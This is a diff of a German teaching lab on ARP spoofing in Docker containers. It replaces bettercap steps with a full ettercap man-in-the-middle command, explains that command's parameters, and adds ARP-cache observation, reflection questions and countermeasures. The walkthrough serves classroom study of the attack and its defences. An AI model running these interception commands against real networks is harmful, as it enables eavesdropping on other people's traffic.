@@ -16,7 +16,7 @@ Nach diesem Lab kannst du...
 
 1. erklären, warum ARP als Protokoll keine Möglichkeit hat, Absender zu authentifizieren
 2. beschreiben, wie ein Angreifer im gleichen Netz den ARP-Cache eines anderen Hosts manipuliert
-3. nachvollziehen, wie unverschlüsselter Traffic als zwischengeschalteter Knoten mitgelesen werden kann
+3. einen ARP-Spoofing-Angriff mit ettercap durchführen und den Datenverkehr mitschneiden
 4. begründen, warum das Opfer einen solchen Angriff nicht unmittelbar bemerkt
 5. geeignete Gegenmaßnahmen auf Netzwerkebene benennen und einordnen
 
@@ -66,15 +66,7 @@ chmod +x setup.sh teardown.sh
 ./setup.sh
 ```
 
-Das Skript startet alle Container, installiert die benötigten Tools
-und zeigt am Ende die IP-Adressen an. Warte bis `Lab ist bereit!` erscheint.
-
-```bash
-docker ps
-# Erwartung: 3 Container (lab02-alice, lab02-gateway, lab02-mallory) mit Status "Up"
-```
-
-Notiere die IP-Adressen aus der Ausgabe:
+Warte bis `Lab ist bereit!` erscheint. Notiere die angezeigten IP-Adressen:
 
 ```
 IP alice   (Opfer):      _______________________
@@ -93,32 +85,31 @@ docker exec -it lab02-alice bash
 # Terminal B – mallory (Angreifer)
 docker exec -it lab02-mallory bash
 
-# Terminal C – gateway (Webserver)
-docker exec -it lab02-gateway sh
+# Terminal C – Host (für Beobachtung)
+# bleibt im normalen Terminal
 ```
 
 ---
 
 ### Schritt 3 – Netzwerk erkunden
 
-Führe auf **alice** (Terminal A) aus:
+Auf **alice** (Terminal A):
 
 ```bash
-# ARP-Cache anzeigen – welche MAC-Adressen sind bekannt?
+# ARP-Cache anzeigen
 arp -n
 
-# Erreichbarkeit des Gateways testen
-ping -c 3 <IP von gateway>
+# Webserver erreichbar?
+curl -s http://<IP von gateway>/
 ```
 
-Notiere die MAC-Adresse, die für gateway eingetragen ist:
+Notiere die MAC-Adresse für gateway:
 
 ```
 MAC-Adresse von gateway (vor Angriff): _______________________________
 ```
 
-> **Frage:** Zu welchem Container gehört diese MAC-Adresse?
-> Überprüfe es:
+> **Frage:** Zu welchem Container gehört diese MAC?
 > ```bash
 > docker exec lab02-gateway ip link show eth0
 > docker exec lab02-mallory ip link show eth0
@@ -126,101 +117,55 @@ MAC-Adresse von gateway (vor Angriff): _______________________________
 
 ---
 
-### Schritt 4 – HTTP-Traffic beobachten
-
-alice sendet bereits automatisch alle 2 Sekunden Anfragen ans Gateway.
-Überzeuge dich davon:
-
-```bash
-# Auf alice (Terminal A):
-curl -s http://<IP von gateway>/
-```
-
-Du siehst die Antwort des Webservers. Merke dir, welche Informationen darin enthalten sind.
-
----
-
-### Schritt 5 – Angriff starten: bettercap
+### Schritt 4 – Angriff starten: ettercap
 
 Wechsle zu **Terminal B (lab02-mallory)**:
 
 ```bash
-bettercap -iface eth0
+ettercap -T -i eth0 -M arp:remote /<IP von alice>// /<IP von gateway>//
 ```
 
-**Wichtig:** Zuerst das Netzwerk scannen – bettercap muss alice und gateway
-kennen, bevor es den Angriff starten kann:
+**Was bedeuten die Parameter?**
 
-```
-net.probe on
-```
+| Parameter | Bedeutung |
+|---|---|
+| `-T` | Text-Modus (kein GUI) |
+| `-i eth0` | Netzwerk-Interface |
+| `-M arp:remote` | MitM via ARP, remote = auch Pakete weiterleiten |
+| `/<IP>//` | Ziel-Host (leere zweite IP = alle Ports) |
 
 Warte bis du siehst:
 ```
-[endpoint.new] endpoint <IP alice> detected ...
-[endpoint.new] endpoint <IP gateway> detected ...
+ARP poisoning victims:
+  GROUP 1 : <IP alice>
+  GROUP 2 : <IP gateway>
+Starting Unified sniffing...
 ```
-
-Zeige die gefundenen Hosts an:
-```
-net.show
-```
-
-> **Frage:** Welche Hosts werden angezeigt? Welche MAC-Adressen sind sichtbar?
 
 ---
 
-### Schritt 6 – ARP-Spoofing aktivieren
+### Schritt 5 – ARP-Cache auf alice beobachten
 
-Erst wenn alice und gateway in `net.show` sichtbar sind:
-
-```
-set arp.spoof.targets <IP von alice>
-set arp.spoof.gateway <IP von gateway>
-set arp.spoof.fullduplex true
-arp.spoof on
-set net.sniff.verbose true
-net.sniff on
-```
-
-Warte ca. 15 Sekunden.
-
----
-
-### Schritt 7 – Merkt alice etwas?
-
-Öffne ein **viertes Terminal** und prüfe den ARP-Cache von alice:
+Öffne **Terminal C** und beobachte den ARP-Cache von alice alle 2 Sekunden:
 
 ```bash
-docker exec lab02-alice arp -n
+watch -n 2 "docker exec lab02-alice arp -n"
 ```
 
-Notiere die MAC-Adresse, die jetzt für gateway eingetragen ist:
+> **Beobachte:** Ändert sich die MAC-Adresse für gateway?
+> Vergleiche mit deiner Notiz aus Schritt 3.
+
+Notiere die MAC nach dem Angriff:
 
 ```
 MAC-Adresse von gateway (nach Angriff): _______________________________
 ```
 
-> **Beobachte:** Hat sich etwas verändert? Vergleiche mit deiner Notiz aus Schritt 3.
-
-Prüfe gleichzeitig, ob alice weiterhin Antworten bekommt:
-
-```bash
-docker exec lab02-alice curl -s http://<IP von gateway>/
-```
-
-**Was fällt auf?**
-
-```
-_______________________________________________
-_______________________________________________
-```
-
 ---
 
-### Schritt 8 – Traffic auf mallory beobachten
+### Schritt 6 – Traffic auf mallory beobachten
 
-Beobachte die `net.sniff`-Ausgabe in Terminal B ca. 30 Sekunden lang.
+Schau auf die ettercap-Ausgabe in Terminal B. Warte ca. 30 Sekunden.
 
 > **Beobachte:**
 > - Was siehst du im Mitschnitt?
@@ -234,10 +179,10 @@ _______________________________________________
 _______________________________________________
 ```
 
-Beobachte parallel die ARP-Ebene auf alice:
+Beobachte parallel die ARP-Pakete auf alice:
 
 ```bash
-# Viertes Terminal:
+# Neues Terminal:
 docker exec lab02-alice tcpdump -i eth0 -n arp
 ```
 
@@ -245,23 +190,15 @@ docker exec lab02-alice tcpdump -i eth0 -n arp
 
 ---
 
-### Schritt 9 – Angriff stoppen
+### Schritt 7 – Merkt alice etwas?
 
-In Terminal B (bettercap-Konsole):
-
-```
-arp.spoof off
-net.sniff off
-exit
-```
-
-Warte ca. 30 Sekunden. Prüfe erneut den ARP-Cache von alice:
+Prüfe in Terminal A, ob die Verbindung noch funktioniert:
 
 ```bash
-docker exec lab02-alice arp -n
+curl -s http://<IP von gateway>/
 ```
 
-**Was beobachtest du?**
+**Was fällt auf?**
 
 ```
 _______________________________________________
@@ -269,26 +206,21 @@ _______________________________________________
 
 ---
 
-### Schritt 10 – Wiederholung mit ettercap
+### Schritt 8 – Angriff stoppen
 
-```bash
-# Auf lab02-mallory (Terminal B):
-ettercap -T -i eth0 -M arp:remote /<IP von alice>// /<IP von gateway>//
-```
+In Terminal B: `Ctrl+Q`
 
-Beende ettercap mit `Ctrl+Q`.
-
-> **Vergleich:** Was zeigt ettercap anders als bettercap?
+> **Was passiert beim Beenden?**
+> ettercap sendet nach dem Beenden automatisch korrekte ARP-Replies,
+> um die vergifteten Caches zu bereinigen. Beobachte den ARP-Cache in Terminal C.
 
 ---
 
-### Schritt 11 – Cleanup
+### Schritt 9 – Cleanup
 
 ```bash
 ./teardown.sh
-
-# Prüfen:
-docker ps
+docker ps   # keine Container mehr aktiv
 ```
 
 ---
@@ -303,20 +235,16 @@ Erkläre, warum alice seinen Traffic an mallory schickt – obwohl alice eigentl
 
 **F3 – Welche Rolle spielt `ip_forward`?**
 Was würde passieren, wenn diese Einstellung auf mallory nicht aktiv wäre?
-Warum ist das für den Angriff entscheidend?
 
-**F4 – Warum muss bettercap zuerst `net.probe on` ausführen?**
-Was passiert, wenn man `arp.spoof on` startet ohne vorher zu scannen?
-
-**F5 – Hat alice etwas bemerkt?**
+**F4 – Hat alice etwas bemerkt?**
 Was sagt dir das über reale Angreiferszenarien in Büro- oder Campusnetzen?
 
-**F6 – Wie nennt sich dieser Angriff?**
+**F5 – Wie nennt sich dieser Angriff?**
 Recherchiere den Fachbegriff für diese Art der Manipulation.
 Welcher übergeordnete Angriffstyp (aus lab01 bekannt) wird damit realisiert?
 
-**F7 – Schutzmaßnahmen**
-Nenne mindestens drei technische Maßnahmen, die diesen Angriff verhindern oder erschweren.
+**F6 – Schutzmaßnahmen**
+Nenne mindestens drei technische Maßnahmen, die diesen Angriff verhindern.
 Auf welcher OSI-Schicht wirkt jeweils welche Maßnahme?
 
 ---
@@ -328,13 +256,9 @@ Auf welcher OSI-Schicht wirkt jeweils welche Maßnahme?
 | `cat /etc/lab-info` | IP-Übersicht anzeigen | alle |
 | `arp -n` | ARP-Cache anzeigen | lab02-alice |
 | `ip link show eth0` | MAC-Adresse anzeigen | alle |
-| `ping -c 3 <ip>` | Erreichbarkeit testen | alle |
 | `curl -s http://<ip>/` | HTTP-Anfrage senden | lab02-alice |
 | `tcpdump -i eth0 -n arp` | ARP-Pakete mitschneiden | lab02-alice |
-| `bettercap -iface eth0` | bettercap starten | lab02-mallory |
-| `net.probe on` | Netz scannen (vor arp.spoof!) | bettercap |
-| `net.show` | Gefundene Hosts anzeigen | bettercap |
-| `ettercap -T -i eth0 -M arp:remote /IP1// /IP2//` | ettercap MitM | lab02-mallory |
+| `ettercap -T -i eth0 -M arp:remote /IP1// /IP2//` | ARP Spoofing + Mitschnitt | lab02-mallory |
+| `watch -n 2 "docker exec lab02-alice arp -n"` | ARP-Cache beobachten | Host |
 | `./setup.sh` | Lab starten | Host |
 | `./teardown.sh` | Lab beenden | Host |
-| `docker exec -it <n> bash` | In Container einloggen | Host |
